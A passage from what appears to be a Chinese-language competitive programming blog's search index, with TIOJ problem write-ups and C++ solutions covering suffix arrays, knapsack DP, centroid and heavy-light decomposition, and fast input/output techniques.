for(int i = n; i \u0026gt;= 0; i--) { while(p \u0026amp;\u0026amp; a[stk[p-1]] \u0026gt;= a[i]) --p; R[i] = (p ? stk[p-1]-1 : n) - i; stk[p++] = i; } for(int i = 0; i \u0026lt; n; i++) sum += R[i]; cout \u0026lt;\u0026lt; n*(n+1)/2 - sum \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } ","permalink":"https://omeletwithoutegg.github.io/2019/12/06/TIOJ-2017/","tags":["TIOJ","monotone-queue"],"title":"TIOJ-2017"},{"contents":"販賣機耶 https://tioj.ck.tp.edu.tw/problems/1614\nDescription 蝴蝶在路旁玩壞一台販賣機，它一次只能投一枚硬幣（故障？）。\n重點是：投進一枚x元的硬幣，然後按退幣鈕，居然會吐出一枚價值 $f(x)$ 的硬幣耶！\n更神秘的是，天才蝴蝶已經發現 $f(x) = x + (x-b_1) (x-b_2) (x-b_3) \\dots (x-b_m)$。\n現在蝴蝶手上有 $n$ 枚硬幣，分別是 $a_1 \\dots a_n$，請問蝴蝶投進去會賺的硬幣有幾枚？\nSolution 題目就是問$f(x)-x = \\prod\\limits _ {i=1}^m (x-b_i)$是不是正的\n然後看有幾個$b_i$小於$x$就可以知道乘積的正負號了(國中數學??)\n另外注意$x - b_i = 0$的case，然後也不要亂 unique ，要保持個數的奇偶性。\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 100025; int n,m,a[N],b[N]; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; for(int i = 0; i \u0026lt; n; i++) cin \u0026gt;\u0026gt; a[i]; for(int i = 0; i \u0026lt; m; i++) cin \u0026gt;\u0026gt; b[i]; sort(b,b+m); int ans = 0; for(int i = 0; i \u0026lt; n; i++) { int j = lower_bound(b,b+m,a[i]) - b; if(!(a[i] == b[j] || (j\u0026amp;1))) ans++; } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } ","permalink":"https://omeletwithoutegg.github.io/2019/12/06/TIOJ-1614/","tags":["TIOJ","math"],"title":"TIOJ-1614"},{"contents":"常用的輸入(出)優化 cin / cout 因為C++ template的性質，不同變數型別的輸出方式都大同小異，算是實用\n競程的時候記得開下面兩個東西\n1 ios_base::sync_with_stdio(0), cin.tie(0); 開了之後就不要使用 stdio 裡面的東西啦\n另外若非互動題也不要使用 endl 之類會flush的函式，請用 '\\n' 代替\nscanf / printf 常用的也就那些\n1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;cstdio\u0026gt; int main() { int x,y; long long L; scanf(\u0026#34;%d%d%lld\u0026#34;, \u0026amp;x, \u0026amp;y, \u0026amp;L); printf(\u0026#34;%lld\\n\u0026#34;, x+y+L); char s[100]; scanf(\u0026#34;%s\u0026#34;, s); for(int i = 0; s[i]; i++) s[i] = (s[i]-\u0026#39;a\u0026#39;+1)%26+\u0026#39;a\u0026#39;; printf(\u0026#34;%s\\n\u0026#34;, s); } 值得注意的是 iostream 的空間有點大，所以想要壓空間用 stdio 就對了\n另外 printf 格式化輸出也常常會在毒瘤題派上用場XD，例如TIOJ 1845\ngetchar scanf 和 cin 都判了很多case(的感覺)\n對於競賽中固定的輸入格式，自己用 getchar() 一個一個字元讀比較快\n1 2 3 4 5 6 7 8 9 #include \u0026lt;cstdio\u0026gt; inline int nextint() { int x = 0, c = getchar(), neg = false; while((\u0026#39;0\u0026#39; \u0026gt; c || c \u0026gt; \u0026#39;9\u0026#39;) \u0026amp;\u0026amp; c!=\u0026#39;-\u0026#39; \u0026amp;\u0026amp; c!=EOF) c = getchar(); if(c == \u0026#39;-\u0026#39;) neg = true, c = getchar(); while(\u0026#39;0\u0026#39; \u0026lt;= c \u0026amp;\u0026amp; c \u0026lt;= \u0026#39;9\u0026#39;) x = x*10 + (c^\u0026#39;0\u0026#39;), c = getchar(); if(neg) x = -x; return x; // returns 0 if EOF } 要印出數字用 printf 就好，如果必須輸出很多可以先存到陣列最後再一起印出，輸出似乎不常成為瓶頸。\nfread 快! 還要更快! 如果輸入非常多的時候，我們可以把getchar改成\n1 2 3 4 5 6 inline char readchar() { const int S = 1\u0026lt;\u0026lt;20; // buffer size static char buf[S], *p = buf, *q = buf; if(p == q \u0026amp;\u0026amp; (q = (p=buf)+fread(buf,1,S,stdin)) == buf) return EOF; return *p++; } 原理可能是自己實現緩衝區，對檔案的讀寫一次做多一點會比較快吧\n這個超有感， 1e7 左右的輸入只要不到50ms，有夠扯，例如TIOJ 1093\nunlocked 有些可以在後綴加上unlocked加速的樣子，可是我常常感覺不到有快多少(?)\ngetchar() -\u0026gt; getchar_unlocked() putchar() -\u0026gt; putchar_unlocked() fread() -\u0026gt; fread_unlocked() ","permalink":"https://omeletwithoutegg.github.io/2019/12/06/Fast-IO/","tags":["template","tutorial","fread"],"title":"Fast-IO"},{"contents":"同步(Sync) https://tioj.ck.tp.edu.tw/problems/1927\nDescription 在一個多人單向卷軸遊戲中，有$N \\leq 10^5$個格子，每個格子都有一個不超過$10^9 + 6$的正整數，代表該格的狀況。\n有時遊戲中的兩人會產生「同步」的現象。產生同步的條件是兩人所在的格子的數字$a,b$分別滿足\n$$\n(ab)^{\\frac{p-1}{2}} \\equiv 1 \\pmod p\n$$\n其中$p = 10^9 + 7$。產生同步後，兩人會瞬移至下一格。如果在下一格又產生「同步」，則會繼續往下走，直到其中一人超出格子範圍(到了終點了)或者兩人不再同步。\nSolution 對於$x \\not\\equiv 0 \\pmod p$，$y = x^{\\frac{p-1}{2}} \\equiv \\pm 1 \\pmod p$\n因為$y$是$1$的平方根(?)\n然後$(ab)^{\\frac{p-1}{2}} \\equiv a^{(\\frac{p-1}{2})} b^{(\\frac{p-1}{2})}$\n所以可先把所有值先$(p-1)/2$次方，一定會是$\\pm 1$，接著他們同步的條件就可以簡化成$a = b$了\n考慮到同步必須要是連續的性質，我們聯想到字串演算法中的後綴陣列，這題等價求兩個後綴的LCP，完全是SA的形狀XDD\nSA + RMQ資結收工\n注意查詢兩個同樣位置的情況，RMQ會查到空區間，不過我們知道這時候的答案顯然就是到尾巴的長度\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 // __________________ // | ________________ | // || ____ || // || /\\ | || // || /__\\ | || // || / \\ |____ || // ||________________|| // |__________________| // \\###################\\ // \\###################\\ // \\ ____ \\ // \\_______\\___\\_______\\ // An AC a day keeps the doctor away. #pragma g++ optimize(\u0026#34;Ofast\u0026#34;) #pragma loop_opt(on) #include \u0026lt;bits/extc++.h\u0026gt; #ifdef local #define debug(x) (cerr\u0026lt;\u0026lt;#x\u0026lt;\u0026lt;\u0026#34; = \u0026#34;\u0026lt;\u0026lt;(x)\u0026lt;\u0026lt;\u0026#39;\\n\u0026#39;) #else #define debug(x) ((void)0) #endif // local using namespace std; typedef int64_t ll; constexpr ll N = 100025, INF = 1e18, MOD = 1000000007, K = 256, inf = 1e9; ll modpow(ll e,ll p,ll m=MOD) { ll r=1; while(p) (p\u0026amp;1)\u0026amp;\u0026amp;(r=r*e%m), e=e*e%m, p\u0026gt;\u0026gt;=1; return r; } template\u0026lt;typename T\u0026gt; struct SuffixArray { int sa[N],rk[N],tmp[N],lcp[N]; void init(T v[],int n) { for(int i = 0; i \u0026lt; n; i++) rk[i] = v[i]; iota(sa,sa+n,0); for(int L = 1; L \u0026lt; n; L*=2) { auto cmp = [\u0026amp;](int a,int b) { if(rk[a]!=rk[b]) return rk[a]\u0026lt;rk[b]; int ra = (a+L\u0026lt;n ? rk[a+L] : -1); int rb = (b+L\u0026lt;n ? rk[b+L] : -1); return ra\u0026lt;rb; }; sort(sa,sa+n,cmp); tmp[sa[0]] = 0; for(int i = 1; i \u0026lt; n; i++) tmp[sa[i]] = tmp[sa[i-1]] + cmp(sa[i-1],sa[i]); for(int i = 0; i \u0026lt; n; i++) rk[i] = tmp[i]; } /* for(int i = 0; i \u0026lt; n; i++) { for(int j = sa[i]; j \u0026lt; n; j++) cout \u0026lt;\u0026lt; v[j] \u0026lt;\u0026lt; \u0026#39; \u0026#39;; cout \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } */ lcp[n-1] = inf; for(int i = 0, h = 0; i \u0026lt; n; i++) { if(!rk[i]) continue; if(h \u0026gt; 0) --h; int j = sa[rk[i]-1]; while(i+h\u0026lt;n \u0026amp;\u0026amp; j+h\u0026lt;n \u0026amp;\u0026amp; v[i+h]==v[j+h]) ++h; lcp[rk[i]-1] = h; } //for(int i = 0; i \u0026lt; n; i++) cout \u0026lt;\u0026lt; lcp[i] \u0026lt;\u0026lt; \u0026#39; \u0026#39;; } }; SuffixArray\u0026lt;int\u0026gt; SA; struct SegmentTree { int mn[N\u0026lt;\u0026lt;1],n; void init(int v[],int _n) { n = _n; for(int i = 0; i \u0026lt; n; i++) mn[i+n] = v[i]; for(int i = n-1; i \u0026gt; 0; i--) mn[i] = min(mn[i\u0026lt;\u0026lt;1], mn[i\u0026lt;\u0026lt;1|1]); } int query(int l,int r) { //cout \u0026lt;\u0026lt; \u0026#34;qry: \u0026#34;; //for(int i = l; i \u0026lt; r; i++) cout \u0026lt;\u0026lt; mn[i+n] \u0026lt;\u0026lt; \u0026#39; \u0026#39;; cout \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; int res = inf; for(l+=n,r+=n; l\u0026lt;r; l\u0026gt;\u0026gt;=1,r\u0026gt;\u0026gt;=1) { if(l\u0026amp;1) res = min(res, mn[l++]); if(r\u0026amp;1) res = min(res, mn[--r]); } return res; } } RMQ; int n,q,v[N]; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; q; for(int i = 0; i \u0026lt; n; i++) cin \u0026gt;\u0026gt; v[i]; for(int i = 0; i \u0026lt; n; i++) v[i] = modpow(v[i], (MOD-1)/2); SA.init(v,n); RMQ.init(SA.lcp,n); for(int i = 0,a,b; i \u0026lt; q; i++) { cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; if(a == b) cout \u0026lt;\u0026lt; n-a \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; else { int l = SA.rk[a], r = SA.rk[b]; if(l \u0026gt; r) swap(l,r); cout \u0026lt;\u0026lt; RMQ.query(l,r) \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } } ","permalink":"https://omeletwithoutegg.github.io/2019/12/06/TIOJ-1927/","tags":["TIOJ","suffix-array","string","math"],"title":"TIOJ-1927"},{"contents":"Ch3. Section 9. 妁艷的頭髮 https://tioj.ck.tp.edu.tw/problems/1774\nSolution 裸背包，被值域嚇到XD\n不過實際上魔力M只會到2000所以沒差的啦\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;iostream\u0026gt; using namespace std; long long n,M,dp[2001]; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; M; for(int i = 0,h,c; i \u0026lt; n; i++) { cin \u0026gt;\u0026gt; h \u0026gt;\u0026gt; c; for(int j = c; j \u0026lt;= M; j++) dp[j] = max(dp[j-c]+h, dp[j]); } cout \u0026lt;\u0026lt; dp[M] \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } ","permalink":"https://omeletwithoutegg.github.io/2019/12/05/TIOJ-1774/","tags":["TIOJ","dp"],"title":"TIOJ-1774"},{"contents":"D.番茄大戰爭 https://tioj.ck.tp.edu.tw/problems/2019\nDescription 兩個人在玩剪刀石頭布，而他們兩個人玩了$T$個回合。兩個人（此處稱為小奕和小安）各自有一個「策略」，分別為兩個字串$A$和$B$。兩個字串皆由R、P、S三個字元組成，分別代表小奕和小安會出石頭、布、剪刀。兩個人都會根據他們的「策略」出題，在第$i$個回合，小奕將會出$A _ {i \\mod {|A|}}$，而小安將出$B _ {i \\mod{|B|}}$，從$i = 0$開始。請輸出：經過$T$個回合後，兩人分別贏了幾局，平手了幾局。\n保證滿足：$1 \\leq T \\leq 10^9$，$1 \\leq |A|, |B| \\leq 10^6$，且$A, B$由R、P、S三個字元組成。\nSolution 首先，看到$1 \\leq T \\leq 10^9$當然想說直接給他寫個$\\mathcal{O}(T)$，寫了五分鐘之後傳上去——AC——了前幾筆，之後就TLE了。所以，當然就來想怪做法嘍！\n先假設$|A| \\leq |B|$。第一個想法就是，對於$A$裏頭的每一個字元$A_i$，我都看一次我會遇到哪些字元（$B_i, B _ {i + |A|}, B _ {i + 2\\times|A|}, \\dots$，也就是所有滿足$(i + k|A|) \\mod{|B|} \\leq T$的$B _ {(i + k|A|)\\mod{|B|}}$，然後再$\\mathcal{O}(1)$更新答案。這樣複雜度依然為$\\mathcal{O}(T)$，因為還是每一個時間點都有戳到一次，只是改變順序而已了。不過！這個順序很重要，因為可以優化！\n若我們看$A_i$，我們先考慮它會遇到那些$B$的字元$$B_i, B _ {i + |A|}, B _ {i + 2\\times|A|}, \\dots $$，也就是所有的$B _ {i + k|A| \\mod{|B|}}$。可以知道，這樣分可以將$B$的所有字元分成若干個相斥的群組$G_t$！具體做法就是，先看$A_i$，如果$B_i$尚未在一個群組裡面，就創立一個新的群組然後將所有的$B _ {i + k|A|}$加進去這個群組裡面。現在，就想要用這個新的資料儲存方式來加快我們的運算。\n同樣的，我們將注意力集中於$A$的字元$A_i$。如果知道這個字元會被掃到幾次（假設是$k$），那是不是可以從$B_i$在其所屬的群組$G$的位子開始爬$k$次（超過邊界就回到$0$）來計算？這樣就會有累加的感覺了，所以下一步就是——對各個群組計算其各個出法（剪刀石頭布）的前綴！所以，我們可以定義$S(i, j, k)$為第$i$個群組中，符號為$j$（以$0,1,2$表示，對應到剪刀石頭布各一），前$k$個位置的前綴和。\n大致的想法知道了，就可以開始去處理細節了！這題細節頗多，彷彿魚刺，得小心！不過，越多魚刺的魚往往更為鮮甜，勿以此而退縮！\nAC code 對不起有點亂qwq 至少目前跑的比baluteshih快啦XD\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 #include \u0026lt;iostream\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;utility\u0026gt; #include \u0026lt;vector\u0026gt; #define pii pair\u0026lt;int,int\u0026gt; #define F first #define S second #define ericxiao ios_base::sync_with_stdio(0);cin.tie(0); using namespace std; const int maxN = 1e6 + 10; int T, gc = 0; string a, b; inline int getId(char c){ if(c == \u0026#39;R\u0026#39;) return 0; if(c == \u0026#39;P\u0026#39;) return 1; if(c == \u0026#39;S\u0026#39;) return 2; return -1; } vector\u0026lt;pii\u0026gt; where; vector\u0026lt;int\u0026gt; groups[maxN]; vector\u0026lt;int\u0026gt; pre[maxN][3]; //ijk: ith group, jth symbol, kth prefix int main(){ ericxiao; cin \u0026gt;\u0026gt; T \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; bool hS = false; if(a.length() \u0026gt; b.length()){ swap(a, b); hS = true; } where.resize(b.length()); fill(where.begin(), where.end(), pii({-1, -1})); int cg, ind, w = 0, l = 0, d = 0; for(int i = 0; i \u0026lt; a.length(); i++){ if(where[i].F != -1) continue; cg = gc++, ind = i; while(where[ind].F == -1){ where[ind] = {cg, groups[cg].size()}; groups[cg].push_back(ind); ind = ( ind + a.length() ) % b.length(); } } for(int g = 0; g \u0026lt; gc; g++){ pre[g][0].resize(groups[g].size()); pre[g][1].resize(groups[g].size()); pre[g][2].resize(groups[g].size()); pre[g][0][0] = pre[g][1][0] = pre[g][2][0] = 0; pre[g][getId(b[groups[g][0]])][0]++; for(int i = 1; i \u0026lt; groups[g].size(); i++){ for(int j = 0; j \u0026lt; 3; j++) pre[g][j][i] = pre[g][j][i - 1]; pre[g][getId(b[groups[g][i]])][i]++; } } int jf, tlt, rem, frqs[3], myId; for(int i = 0; i \u0026lt; a.length(); i++){ if(i \u0026gt;= T) continue; jf = (T - i - 1) / a.length() + 1; //ijk: ith group, jth symbol, kth prefix //group index: groups[where[i].F] //position in group: where[i].S //want to loop forward (T - i) / a.length() times //total loop time: /* (group.size() - [group pos]) + tlt * |group| \u0026lt;= jf tlt = (jf - group.size() + [group pos]) / |group| remaining number to go: jf - ((group.size() - [group pos]) + tlt * |group|) */ if(jf + where[i].S \u0026gt;= groups[where[i].F].size()){ tlt = (jf - (groups[where[i].F].size() - where[i].S)) / groups[where[i].F].size(); rem = jf - (groups[where[i].F].size() - where[i].S + tlt * groups[where[i].F].size()); for(int j = 0; j \u0026lt; 3; j++){ frqs[j] = pre[where[i].F][j][groups[where[i].F].size() - 1] * (tlt + 1) + (rem ? pre[where[i].F][j][rem - 1] : 0) - (where[i].S ? pre[where[i].F][j][where[i].S - 1] : 0); } } else { for(int j = 0; j \u0026lt; 3; j++){ frqs[j] = pre[where[i].F][j][jf + where[i].S - 1] - (where[i].S ? pre[where[i].F][j][where[i].S - 1] : 0); } } myId = getId(a[i]); w += frqs[(myId + 2) % 3]; l += frqs[(myId + 1) % 3]; d += frqs[(myId) % 3]; } if(!hS){ cout \u0026lt;\u0026lt; w \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; l \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; d \u0026lt;\u0026lt; endl; } else { cout \u0026lt;\u0026lt; l \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; w \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; d \u0026lt;\u0026lt; endl; } /* 100 RRR PPPP 1 S RPPPSPPRSS */ } ","permalink":"https://omeletwithoutegg.github.io/2019/12/05/TIOJ-2019/","tags":["TIOJ","math"],"title":"TIOJ-2019"},{"contents":"我要成為海賊王 https://tioj.ck.tp.edu.tw/problems/1171\nDescription 給定一棵樹，一開始所有頂點都是白色的，有$q$次操作，每次操作可以把一個頂點塗成黑色，或者詢問某個頂點$x$到所有黑色頂點的距離和\nSolution 可能算是經典題吧，這邊提供兩種寫法: 重心剖分和輕重鍊剖分\n重心剖分 重心剖分的核心想法是樹分治，每次拔掉一個點，並統計有經過這個點的答案並遞迴計算沒經過該點的答案\n為了確保複雜度，每次拔掉重心是一個好選擇\n也許可以發現每個頂點都會當一次重心(?)\n並且若把每次拔掉的重心$c$和分治下去的每個子樹找到的重心$c\u0026rsquo;$都連邊，也會是一棵樹，稱為重心樹\n假設我要查詢$x$這個點，我們就枚舉$x$在重心樹上的祖先\n對於所有黑色頂點$b$來說都可以找到恰一個祖先$c$使得$b,x$最後是被$c$分開的\n可以想到紀錄$cnt_c, sum_c$分別代表分治到以$c$為重心的時候的子樹中，黑色節點的數量以及與$c$的距離和\n加加減減就能得到答案了\n算式好難推QQ去查了YP的題解才知道怎麼寫\n記得在重心樹往上爬的時候必須減掉和下一層有關的一些東西，要避免有重複的邊的路徑被計算到\n式子可能長得像這樣吧\n$$\n\\sum _ {p\\not=croot} sum_q + cnt_q \\cdot path(q,x) - sum_p - cnt_p \\cdot path(p,q)\n$$\n其中$q$是$p$在重心樹上的父節點\n每次詢問的複雜度是重心樹的深度也就是$\\mathcal{O}(\\log n)$\n輕重鍊剖分 用$b$和$B$代表黑色頂點和他們的集合，$dis_v$代表從根走到$v$的距離\n把所求寫成\n$$\n\\sum _ {b\\in B} dis_x + \\sum _ {b\\in B} dis_b - 2\\sum _ {b\\in B} dis _ {LCA(b,x)} = |B|dis_x + \\sum _ {b\\in B}dis_b - 2 \\sum _ {b\\in B} dis _ {LCA(b,x)}\n$$\n關注最後一項，想成枚舉$x$到根的所有邊$e$\n可以發現：$dis _ {LCA(b,x)}$有包含某個$e$ $\\Leftrightarrow$ $b$到根會經過$e$且$x$到根會經過$e$\n所以對每個邊維護一個值$sum_e$，把一個點$x$塗黑的時候就把$x$到根會經過的$sum_e$都加上$e$的長度，查詢$x$的時候就看$x$到根所有邊的$sum_e$總和\n如果畫成圖大概長這樣\n紅藍紫代表那個邊被加幾次，而橘色的框框代表查詢$x$要看的邊\n按照慣例把算邊改成算點，用$e$深度較深的點來代表$e$\n輕重鍊剖分可以把點到根的路徑分成遍歷順序的$\\mathcal{O}(\\log n)$個區間，再搭配一個線段樹處理「區間加值、區間加權和」就可以啦\n這個寫法每次詢問的複雜度是$\\mathcal{O}(\\log^2n)$，如果用link-cut-tree可以到$\\mathcal{O}(\\log n)$的樣子\nAC code 因為1-base好像比較安全我就擅自把輸入都+1了OwO\n重心剖分 好醜(X\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 // __________________ // | ________________ | // || ____ || // || /\\ | || // || /__\\ | || // || / \\ |____ || // ||________________|| // |__________________| // \\###################\\ // \\###################\\ // \\ ____ \\ // \\_______\\___\\_______\\ // An AC a day keeps the doctor away. #pragma GCC optimize(\u0026#34;Ofast,unroll-loops,no-stack-protector\u0026#34;) #pragma loop_opt(on) #include \u0026lt;bits/extc++.h\u0026gt; #ifdef local #define debug(x) (cerr\u0026lt;\u0026lt;#x\u0026lt;\u0026lt;\u0026#34; = \u0026#34;\u0026lt;\u0026lt;(x)\u0026lt;\u0026lt;\u0026#39;\\n\u0026#39;) #else #define debug(x) ((void)0) #endif // local #define all(v) begin(v),end(v) #define siz(v) (ll(v.size())) #define get_pos(v,x) (lower_bound(all(v),x)-begin(v)) #define sort_uni(v) sort(begin(v),end(v)),v.erase(unique(begin(v),end(v)),end(v)) #define pb emplace_back #define ff first #define ss second #define mid (l+(r-l\u0026gt;\u0026gt;1)) #define mem(v,x) memset(v,x,sizeof v) #define int ll using namespace std; using namespace __gnu_pbds; typedef int64_t ll; typedef long double ld; typedef pair\u0026lt;ll,ll\u0026gt; pll; typedef pair\u0026lt;ld,ld\u0026gt; pld; template \u0026lt;typename T\u0026gt; using max_heap = __gnu_pbds::priority_queue\u0026lt;T,less\u0026lt;T\u0026gt; \u0026gt;; template \u0026lt;typename T\u0026gt; using min_heap = __gnu_pbds::priority_queue\u0026lt;T,greater\u0026lt;T\u0026gt; \u0026gt;; template \u0026lt;typename T\u0026gt; using rbt = tree\u0026lt;T,null_type,less\u0026lt;T\u0026gt;,rb_tree_tag,tree_order_statistics_node_update\u0026gt;; constexpr ld PI = acos(-1), eps = 1e-9; constexpr ll N = 100025, INF = 1e18, MOD = 20191126, K = 20, inf = 1e9; constexpr ll modpow(ll e,ll p,ll m=MOD) {ll r=1; for(;p;p\u0026gt;\u0026gt;=1,e=e*e%m) if(p\u0026amp;1) r=r*e%m; return r;} constexpr inline ll cdiv(ll x, ll m) { return (x+m-1)/m; } // ceiling divide, x/m for flooring divide template \u0026lt;typename T\u0026gt; void M(T \u0026amp;x, ll m=MOD){x%=m; if(x\u0026lt;0) x+=m;} struct Edge { ll v,w; // v=a^b } E[N]; int vis[N],sz[N],mxs[N],cpa[N],cdep[N]; ll dis[K][N]; vector\u0026lt;int\u0026gt; g[N],tmp; void dfs(int u) { vis[u] = true, mxs[u] = 0, sz[u] = 1; tmp.pb(u); for(int id:g[u]) { int v = E[id].v^u; if(!vis[v]) dfs(v), mxs[u] = max(mxs[u], sz[v]), sz[u] += sz[v]; } } void get_dis(int u,int d) { // get distance to centroid whose depth is d vis[u] = true; for(int id:g[u]) { int v = E[id].v^u; if(!vis[v]) dis[d][v] = dis[d][u]+E[id].w, get_dis(v,d); } } void deco(int u,int dep=1,int pa=0) { // centroid decomposition tmp.clear(); dfs(u); int c = u, S = tmp.size(); for(int i:tmp) { if(max(S-sz[i],mxs[i]) \u0026lt; max(S-sz[c], mxs[c])) c = i; vis[i] = 0; } dis[dep][c] = 0; get_dis(c,dep); for(int i:tmp) vis[i] = 0; vis[c] = true; cpa[c] = pa; cdep[c] = dep; for(int id:g[c]) { int v = E[id].v^c; if(!vis[v]) deco(v,dep+1,c); } } ll ans[N],re[N],cnt[N]; void update(int p) { for(int x = p, d = cdep[p]; x; x = cpa[x], --d) { ans[x] += dis[d][p]; re[x] += dis[d-1][p]; ++cnt[x]; } } ll query(int p) { ll res = 0, now = 0; for(int x = p, d = cdep[p]; x; x = cpa[x], --d) { res += (ans[x] - re[x]) + (cnt[x] - now) * dis[d][p]; now = cnt[x]; } return res; } bitset\u0026lt;N\u0026gt; color; signed main() { int n,q; ios_base::sync_with_stdio(0), cin.tie(0); cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; q; for(int i = 0,a,b,w; i \u0026lt; n-1; i++) { cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b \u0026gt;\u0026gt; w, a++, b++; E[i] = {a^b,w}; g[a].pb(i), g[b].pb(i); } deco(1); //for(int i = 1; i \u0026lt;= n; i++) cout \u0026lt;\u0026lt; cpa[i] \u0026lt;\u0026lt; \u0026#34; \\n\u0026#34;[i==n]; //for(int i = 1; i \u0026lt;= n; i++) cout \u0026lt;\u0026lt; cdep[i] \u0026lt;\u0026lt; \u0026#34; \\n\u0026#34;[i==n]; //for(int i = 1; i \u0026lt;= n; i++) cout \u0026lt;\u0026lt; dis[1][i] \u0026lt;\u0026lt; \u0026#34; \\n\u0026#34;[i==n]; while(q--) { int t,v; cin \u0026gt;\u0026gt; t \u0026gt;\u0026gt; v, v++; if(t == 2) cout \u0026lt;\u0026lt; query(v) \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; else if(t == 1 \u0026amp;\u0026amp; !color[v]) color[v] = true, update(v); //for(int i = 1; i \u0026lt;= n; i++) cout\u0026lt;\u0026lt;ans[i]\u0026lt;\u0026lt;\u0026#34; \\n\u0026#34;[i==n]; } } 輕重鍊剖分 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 // __________________ // | ________________ | // || ____ || // || /\\ | || // || /__\\ | || // || / \\ |____ || // ||________________|| // |__________________| // \\###################\\ // \\###################\\ // \\ ____ \\ // \\_______\\___\\_______\\ // An AC a day keeps the doctor away. #pragma g++ optimize(\u0026#34;Ofast\u0026#34;) #pragma loop_opt(on) #include \u0026lt;bits/extc++.h\u0026gt; #ifdef local #define debug(x) (cerr\u0026lt;\u0026lt;#x\u0026lt;\u0026lt;\u0026#34; = \u0026#34;\u0026lt;\u0026lt;(x)\u0026lt;\u0026lt;\u0026#39;\\n\u0026#39;) #else #define debug(x) ((void)0) #endif // local using namespace std; typedef int64_t ll; constexpr ll N = 100001, INF = 1e18, MOD = 1000000007, K = 256, inf = 1e9; struct SegmentTree { ll w[N\u0026lt;\u0026lt;1],sum[N\u0026lt;\u0026lt;1]; int laz[N],n; void init(int _w[],int _n) { n = _n; for(int i = 0; i \u0026lt; n; i++) w[i+n] = _w[i]; for(int i = n-1; i \u0026gt; 0; i--) w[i] = w[i\u0026lt;\u0026lt;1]+w[i\u0026lt;\u0026lt;1|1]; } void upd(int p,int d) { sum[p] += d*w[p]; if(p \u0026lt; n) laz[p] += d; } void pull(int p) { while(p\u0026gt;1) sum[p\u0026gt;\u0026gt;1] = sum[p]+sum[p^1]+laz[p\u0026gt;\u0026gt;1]*w[p\u0026gt;\u0026gt;1], p\u0026gt;\u0026gt;=1; } void push(int p) { for(int h = __lg(n); h \u0026gt;= 0; h--) { int i = p\u0026gt;\u0026gt;h; if(!laz[i\u0026gt;\u0026gt;1]) continue; upd(i,laz[i\u0026gt;\u0026gt;1]); upd(i^1,laz[i\u0026gt;\u0026gt;1]); laz[i\u0026gt;\u0026gt;1] = 0; } } void edit(int l,int r,int d) { int L = l, R = r; for(l+=n,r+=n; l\u0026lt;r; l\u0026gt;\u0026gt;=1,r\u0026gt;\u0026gt;=1) { if(l\u0026amp;1) upd(l++,d); if(r\u0026amp;1) upd(--r,d); } pull(L+n), pull(R-1+n); } ll query(int l,int r) { ll res = 0; push(l+n), push(r-1+n); for(l+=n,r+=n; l\u0026lt;r; l\u0026gt;\u0026gt;=1,r\u0026gt;\u0026gt;=1) { if(l\u0026amp;1) res += sum[l++]; if(r\u0026amp;1) res += sum[--r]; } return res; } } sgt; struct HeavyLightDecomposition { struct Edge {int cost,to;}; vector\u0026lt;Edge\u0026gt; g[N]; int pa[N],pa_d[N]; int sz[N],mxs[N],id[N],link_top[N]; int 